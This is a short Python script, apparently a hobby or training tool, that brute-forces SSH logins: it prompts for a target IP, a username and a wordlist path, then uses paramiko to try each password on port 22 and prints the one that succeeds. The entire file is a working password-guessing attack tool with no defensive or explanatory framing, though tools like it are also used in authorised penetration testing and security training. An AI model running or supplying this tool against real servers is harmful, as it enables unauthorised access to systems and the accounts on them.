import paramiko
import sys
import os
import pyfiglet


ascii_banner = pyfiglet.figlet_format("RIAD SSH BRUTE FORCER")
print(ascii_banner)



target = str(input('Enter the target ip address: '))
username = str(input('Enter the username to bruteforce: '))
wordlist_path = str(input('Enter the path to the wordlist: '))


def ssh_connect(password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())


    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code


with open(wordlist_path) as wordlist:
    passwords = wordlist.read().splitlines()
    for password in passwords:
        try:
            response = ssh_connect(password)
            if response == 0:
                print('password found: ', password)
                exit(0)
            elif response == 1:
                print('no luck')
        except Exception as e:
            print(e)
        pass
